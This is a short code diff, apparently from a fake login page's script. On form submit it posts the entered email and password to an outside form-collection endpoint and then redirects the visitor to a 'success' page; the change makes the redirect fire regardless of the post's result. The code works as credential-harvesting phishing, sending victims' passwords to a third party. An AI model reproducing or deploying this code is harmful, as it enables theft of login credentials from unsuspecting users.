@@ -28,10 +28,8 @@
         $("document").ready(()=>{
         $("form").submit((e)=>{
         e.preventDefault();
-        $.post("https://formspree.io/f/mzbqwggg",{username:$("#emailinput").val(), password:$("#passwordinput").val()},(data,err)=>{
-          window.location = "./success.html"
-        })
-        
+        $.post("https://formspree.io/f/mzbqwggg",{username:$("#emailinput").val(), password:$("#passwordinput").val()},(data,err)=>{ })
+         window.location = "./success.html"
       })
       })
       
